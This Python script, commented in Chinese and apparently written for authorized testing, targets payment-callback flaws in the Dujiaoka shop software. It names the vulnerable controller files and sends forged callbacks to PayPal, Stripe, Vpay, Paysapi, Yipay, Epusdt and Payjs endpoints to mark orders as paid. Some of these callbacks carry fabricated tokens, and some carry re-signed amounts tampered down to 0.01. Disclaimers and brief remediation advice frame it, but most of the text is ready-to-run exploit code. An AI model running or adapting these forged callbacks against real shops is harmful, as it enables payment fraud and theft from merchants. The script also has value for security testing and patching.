#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
独角数卡(Dujiaoka) 支付漏洞测试脚本
测试目标: 检测回调绕过、金额篡改等支付安全漏洞

!!! 仅用于授权安全测试 !!!
!!! 使用前请确保已获得书面授权 !!!

Author: Security Test Suite
Date: 2026-03-19
"""

import argparse
import hashlib
import json
import sys
import time
import random
import string
from urllib.parse import urlencode, urljoin

try:
    import requests
except ImportError:
    print("[-] 需要 requests 库，请运行: pip3 install requests")
    sys.exit(1)


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'


def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")


def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")


def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")


def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")


def generate_random_string(length=16):
    """生成随机字符串"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def test_paypal_callback(target_url, order_sn):
    """
    测试Paypal同步回调绕过漏洞
    
    漏洞原理:
    - returnUrl() 方法只验证了PayPal返回的参数是否存在
    - 没有验证支付是否真正成功
    - 攻击者可以直接构造请求完成订单
    """
    log_info(f"测试 Paypal 回调绕过漏洞 (订单: {order_sn})")
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/PaypalPayController.php:80-119
    问题: 
      1. 只检查 paymentId 和 PayerID 是否为空
      2. 没有验证支付是否真正成功
      3. 直接使用数据库订单金额完成订单
    """
    print(vuln_info)
    
    fake_payment_id = "PAYPAL_" + generate_random_string(12)
    fake_payer_id = "PAYER_" + generate_random_string(12)
    
    params = {
        "success": "ok",
        "paymentId": fake_payment_id,
        "PayerID": fake_payer_id,
        "orderSN": order_sn
    }
    
    full_url = urljoin(target_url, "/pay/paypal/return_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(params, indent=2)}")
    
    try:
        response = requests.get(full_url, params=params, timeout=10, allow_redirects=False)
        
        log_warning(f"响应状态码: {response.status_code}")
        
        if response.status_code in [200, 302]:
            log_success("请求已发送 - 检查订单是否已变为已完成状态")
            log_info("注意: 此漏洞需要PayPal API验证才能确认是否成功")
            return True
        else:
            log_error(f"响应异常: {response.status_code}")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_stripe_check_callback(target_url, order_sn):
    """
    测试 Stripe check() 回调绕过漏洞
    
    漏洞原理:
    - check() 方法通过前端轮询调用
    - 只验证 source 状态为 'consumed' 和订单号匹配
    - 没有验证实际支付金额
    """
    log_info(f"测试 Stripe check() 回调绕过漏洞 (订单: {order_sn})")
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/StripeController.php:458-485
    问题:
      1. source 来自前端传入，可被控制
      2. 只验证 source 状态为 'consumed'
      3. 没有验证实际支付金额
    """
    print(vuln_info)
    
    fake_source = "src_" + generate_random_string(24)
    
    params = {
        "orderid": order_sn,
        "source": fake_source
    }
    
    full_url = urljoin(target_url, "/pay/stripe/check")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(params, indent=2)}")
    
    try:
        response = requests.get(full_url, params=params, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text[:200]}")
        
        if "success" in response.text:
            log_success("可能存在漏洞: 收到 success 响应")
            return True
        else:
            log_warning("收到非成功响应 - 可能订单不存在或已处理")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_stripe_charge_callback(target_url, order_sn):
    """
    测试 Stripe charge() 回调漏洞
    
    漏洞原理:
    - 直接接收前端传入的 stripeToken
    - 使用本地订单金额完成订单
    - 如果 Stripe API 验证不严格，可被利用
    """
    log_info(f"测试 Stripe charge() 回调漏洞 (订单: {order_sn})")
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/StripeController.php:487-512
    问题:
      1. 直接使用前端传来的 stripeToken
      2. 使用本地订单金额 $cacheord->actual_price
      3. 如果 token 格式正确，即使支付失败也可能完成订单
    """
    print(vuln_info)
    
    fake_token = "tok_" + generate_random_string(24)
    
    params = {
        "orderid": order_sn,
        "stripeToken": fake_token
    }
    
    full_url = urljoin(target_url, "/pay/stripe/charge")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(params, indent=2)}")
    
    try:
        response = requests.get(full_url, params=params, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text[:200]}")
        
        if "success" in response.text:
            log_success("可能存在漏洞")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_vpay_notify(target_url, order_sn, merchant_id):
    """
    测试 Vpay 金额篡改漏洞
    
    漏洞原理:
    - notifyUrl() 接收回调参数中的 price 和 reallyPrice
    - 签名验证通过后，直接使用传入的金额完成订单
    - 攻击者可设置极低金额完成订单
    """
    log_info(f"测试 Vpay 金额篡改漏洞 (订单: {order_sn})")
    
    if not merchant_id:
        log_error("需要提供 merchant_id (-k/--merchant-key)")
        return False
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/VpayController.php:52-84
    问题:
      1. 使用回调传入的 price 和 reallyPrice
      2. 签名只验证格式，不验证金额合理性
      3. 攻击者可设置 price=0.01 完成订单
    """
    print(vuln_info)
    
    pay_id = "V" + generate_random_string(14)
    param = order_sn
    pay_type = "1"
    price = "0.01"
    really_price = "0.01"
    
    sign_str = f"{pay_id}{param}{pay_type}{price}{really_price}{merchant_id}"
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    data = {
        "payId": pay_id,
        "param": param,
        "type": pay_type,
        "price": price,
        "reallyPrice": really_price,
        "sign": sign
    }
    
    full_url = urljoin(target_url, "/pay/vpay/notify_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(data, indent=2)}")
    
    try:
        response = requests.post(full_url, data=data, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text}")
        
        if "success" in response.text.lower():
            log_success("可能存在漏洞: 订单可能已用极低金额完成")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_paysapi_notify(target_url, order_sn, token):
    """
    测试 Paysapi 金额篡改漏洞
    
    漏洞原理:
    - notifyUrl() 直接使用回调传入的 price
    - 签名验证通过后，使用传入金额完成订单
    """
    log_info(f"测试 Paysapi 金额篡改漏洞 (订单: {order_sn})")
    
    if not token:
        log_error("需要提供 token (-t/--token)")
        return False
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/PaysapiController.php:81-104
    问题:
      1. 直接使用回调传入的 price 参数
      2. 签名验证通过后不做金额校验
      3. 攻击者可设置极低金额完成订单
    """
    print(vuln_info)
    
    order_uid = "test@example.com"
    paysapi_id = "PS" + generate_random_string(12)
    price = "0.01"
    real_price = "0.01"
    
    sign_str = f"{order_sn}{order_uid}{paysapi_id}{price}{real_price}{token}"
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    data = {
        "orderid": order_sn,
        "orderuid": order_uid,
        "paysapi_id": paysapi_id,
        "price": price,
        "realprice": real_price,
        "key": sign
    }
    
    full_url = urljoin(target_url, "/pay/paysapi/notify_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(data, indent=2)}")
    
    try:
        response = requests.post(full_url, data=data, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text}")
        
        if "success" in response.text.lower():
            log_success("可能存在漏洞")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_yipay_notify(target_url, order_sn, merchant_pem):
    """
    测试 Yipay 金额篡改漏洞
    
    漏洞原理:
    - notifyUrl() 使用回调传入的 money 参数
    - 签名验证通过后不做金额校验
    """
    log_info(f"测试 Yipay 金额篡改漏洞 (订单: {order_sn})")
    
    if not merchant_pem:
        log_error("需要提供 merchant_pem (-m/--merchant-pem)")
        return False
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/YipayController.php:59-93
    问题:
      1. 使用回调传入的 money 参数
      2. 签名验证通过后直接使用该金额
      3. 攻击者可设置极低金额完成订单
    """
    print(vuln_info)
    
    trade_no = "YP" + generate_random_string(12)
    money = "0.01"
    
    sign_data = {
        "out_trade_no": order_sn,
        "trade_no": trade_no,
        "money": money
    }
    
    keys = sorted([k for k in sign_data.keys() if sign_data[k]])
    sign_parts = [f"{k}={sign_data[k]}" for k in keys]
    sign_str = "&".join(sign_parts) + merchant_pem
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    params = {
        **sign_data,
        "trade_no": trade_no,
        "sign_type": "MD5",
        "sign": sign
    }
    
    full_url = urljoin(target_url, "/pay/yipay/notify_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(params, indent=2)}")
    
    try:
        response = requests.get(full_url, params=params, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text}")
        
        if "success" in response.text.lower():
            log_success("可能存在漏洞")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_epusdt_notify(target_url, order_sn, merchant_id):
    """
    测试 Epusdt 金额篡改漏洞
    """
    log_info(f"测试 Epusdt 金额篡改漏洞 (订单: {order_sn})")
    
    if not merchant_id:
        log_error("需要提供 merchant_id (-k/--merchant-key)")
        return False
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/EpusdtController.php:71-94
    问题:
      1. 使用回调传入的 amount 参数
      2. 签名验证通过后直接使用该金额
      3. 攻击者可设置极低金额完成订单
    """
    print(vuln_info)
    
    amount = "0.01"
    trade_id = "EP" + generate_random_string(12)
    
    sign_data = {
        "order_id": order_sn,
        "amount": amount,
        "trade_id": trade_id
    }
    
    keys = sorted([k for k in sign_data.keys() if sign_data[k]])
    sign_parts = [f"{k}={sign_data[k]}" for k in keys]
    sign_str = "&".join(sign_parts) + merchant_id
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    data = {
        **sign_data,
        "signature": sign
    }
    
    full_url = urljoin(target_url, "/pay/epusdt/notify_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(data, indent=2)}")
    
    try:
        response = requests.post(full_url, json=data, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text}")
        
        if "ok" in response.text.lower() or "success" in response.text.lower():
            log_success("可能存在漏洞")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def test_payjs_notify(target_url, order_sn):
    """
    测试 Payjs 回调漏洞
    """
    log_info(f"测试 Payjs 回调漏洞 (订单: {order_sn})")
    
    vuln_info = """
    文件: app/Http/Controllers/Pay/PayjsController.php:49-68
    问题:
      1. 使用 Payjs::notify() 获取支付信息
      2. 使用第三方返回的金额完成订单
      3. 如果 Payjs 签名验证被绕过，可被利用
    """
    print(vuln_info)
    
    params = {
        "out_trade_no": order_sn,
        "total_fee": "1",
        "payjs_order_id": "PAYJS" + generate_random_string(12),
        "return_code": "1"
    }
    
    full_url = urljoin(target_url, "/pay/payjs/notify_url")
    
    log_info(f"发送恶意请求到: {full_url}")
    log_info(f"参数: {json.dumps(params, indent=2)}")
    
    try:
        response = requests.post(full_url, data=params, timeout=10)
        
        log_warning(f"响应状态码: {response.status_code}")
        log_info(f"响应内容: {response.text}")
        
        if "success" in response.text.lower():
            log_success("可能存在漏洞")
            return True
        else:
            log_warning("收到非成功响应")
            return False
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return False


def check_order_status(target_url, order_sn):
    """检查订单状态"""
    log_info(f"检查订单状态: {order_sn}")
    
    full_url = urljoin(target_url, f"/order-info/{order_sn}")
    
    try:
        response = requests.get(full_url, timeout=10)
        
        if response.status_code == 200:
            if "已完成" in response.text or "completed" in response.text.lower():
                log_warning("订单状态: 已完成 (可能已支付或被恶意完成)")
                return "completed"
            elif "待支付" in response.text or "wait" in response.text.lower():
                log_success("订单状态: 待支付 (未受影响)")
                return "wait_pay"
            else:
                log_info("订单状态: 未知")
                return "unknown"
        else:
            log_error(f"无法访问订单页面: {response.status_code}")
            return "error"
            
    except requests.RequestException as e:
        log_error(f"请求失败: {e}")
        return "error"


def generate_report(results):
    """生成测试报告"""
    vuln_count = sum(1 for r in results.values() if r)
    safe_count = sum(1 for r in results.values() if not r)
    
    report = f"""
================================================================================
                        独角数卡支付漏洞测试报告
================================================================================

测试摘要:
--------
总测试数: {len(results)}
成功/可能存在漏洞: {vuln_count}
安全(未发现漏洞): {safe_count}

详细结果:
---------
"""
    
    for test_name, result in results.items():
        status = f"{Colors.RED}[漏洞存在]{Colors.RESET}" if result else f"{Colors.GREEN}[安全]{Colors.RESET}"
        report += f"\n  - {test_name}: {status}\n"
    
    report += """
================================================================================
                            免责声明
================================================================================
本测试脚本仅用于授权的安全测试。使用本脚本即表示您同意:
1. 仅对您拥有或已获得书面授权的系统进行测试
2. 对任何未经授权的系统使用本脚本均属违法行为
3. 作者不对使用本脚本造成的任何后果负责
================================================================================
"""
    
    print(report)
    return report


def main():
    parser = argparse.ArgumentParser(
        description="独角数卡(Dujiaoka) 支付漏洞测试工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 测试所有漏洞(需要提供必要参数)
  python3 dujiaotest.py -u http://localhost -o ORDER123456 -k merchant_id -t token
  
  # 只测试Paypal漏洞
  python3 dujiaotest.py -u http://localhost -o ORDER123456 --paypal-only
  
  # 只测试Stripe漏洞  
  python3 dujiaotest.py -u http://localhost -o ORDER123456 --stripe-only
  
  # 测试Vpay漏洞(需要merchant_id)
  python3 dujiaotest.py -u http://localhost -o ORDER123456 -k YOUR_MERCHANT_ID --vpay-only
  
  # 检查订单状态
  python3 dujiaotest.py -u http://localhost -o ORDER123456 --check-status

注意事项:
  - 大多数漏洞需要正确的签名密钥才能利用
  - 使用前请确保获得书面授权
  - 建议先使用 --check-status 确认订单存在
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="目标网站URL (例如: http://localhost)")
    parser.add_argument("-o", "--order", required=True, help="测试用订单号")
    parser.add_argument("-k", "--merchant-key", help="商户密钥/ID (用于Vpay/Epusdt测试)")
    parser.add_argument("-t", "--token", help="Paysapi Token")
    parser.add_argument("-m", "--merchant-pem", help="商户PEM/密钥 (用于Yipay测试)")
    
    parser.add_argument("--paypal-only", action="store_true", help="只测试Paypal漏洞")
    parser.add_argument("--stripe-only", action="store_true", help="只测试Stripe漏洞")
    parser.add_argument("--vpay-only", action="store_true", help="只测试Vpay漏洞")
    parser.add_argument("--paysapi-only", action="store_true", help="只测试Paysapi漏洞")
    parser.add_argument("--yipay-only", action="store_true", help="只测试Yipay漏洞")
    parser.add_argument("--epusdt-only", action="store_true", help="只测试Epusdt漏洞")
    parser.add_argument("--payjs-only", action="store_true", help="只测试Payjs漏洞")
    parser.add_argument("--check-status", action="store_true", help="只检查订单状态")
    
    args = parser.parse_args()
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║          独角数卡(Dujiaoka) 支付漏洞测试工具 v1.0                             ║
║                                                                              ║
║          [!] 仅用于授权安全测试 使用前请确保已获得书面授权                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    target_url = args.url.rstrip('/')
    order_sn = args.order
    
    log_info(f"目标: {target_url}")
    log_info(f"订单号: {order_sn}")
    print()
    
    results = {}
    
    if args.check_status:
        check_order_status(target_url, order_sn)
        return
    
    if args.paypal_only or args.stripe_only or args.vpay_only or args.paysapi_only or args.yipay_only or args.epusdt_only or args.payjs_only:
        if args.paypal_only:
            results["Paypal回调绕过"] = test_paypal_callback(target_url, order_sn)
        if args.stripe_only:
            results["Stripe回调绕过"] = test_stripe_check_callback(target_url, order_sn)
            results["Stripe charge漏洞"] = test_stripe_charge_callback(target_url, order_sn)
        if args.vpay_only:
            results["Vpay金额篡改"] = test_vpay_notify(target_url, order_sn, args.merchant_key)
        if args.paysapi_only:
            results["Paysapi金额篡改"] = test_paysapi_notify(target_url, order_sn, args.token)
        if args.yipay_only:
            results["Yipay金额篡改"] = test_yipay_notify(target_url, order_sn, args.merchant_pem)
        if args.epusdt_only:
            results["Epusdt金额篡改"] = test_epusdt_notify(target_url, order_sn, args.merchant_key)
        if args.payjs_only:
            results["Payjs回调"] = test_payjs_notify(target_url, order_sn)
    else:
        log_warning("运行所有漏洞测试...")
        print()
        
        results["Paypal回调绕过"] = test_paypal_callback(target_url, order_sn)
        print()
        
        results["Stripe check绕过"] = test_stripe_check_callback(target_url, order_sn)
        print()
        
        results["Stripe charge漏洞"] = test_stripe_charge_callback(target_url, order_sn)
        print()
        
        if args.merchant_key:
            results["Vpay金额篡改"] = test_vpay_notify(target_url, order_sn, args.merchant_key)
            print()
            
            results["Epusdt金额篡改"] = test_epusdt_notify(target_url, order_sn, args.merchant_key)
            print()
        
        if args.token:
            results["Paysapi金额篡改"] = test_paysapi_notify(target_url, order_sn, args.token)
            print()
        
        if args.merchant_pem:
            results["Yipay金额篡改"] = test_yipay_notify(target_url, order_sn, args.merchant_pem)
            print()
        
        results["Payjs回调"] = test_payjs_notify(target_url, order_sn)
        print()
    
    if results:
        print()
        log_warning("=" * 60)
        generate_report(results)
        
        log_info("建议修复措施:")
        print("""
  1. 所有支付回调必须使用数据库订单金额进行校验
  2. completedOrder() 应作为唯一入口，统一处理金额校验
  3. 移除对回调参数的信任，验证签名和支付状态
  4. 建议使用第三方 SDK 的标准验证流程
        """)


if __name__ == "__main__":
    main()
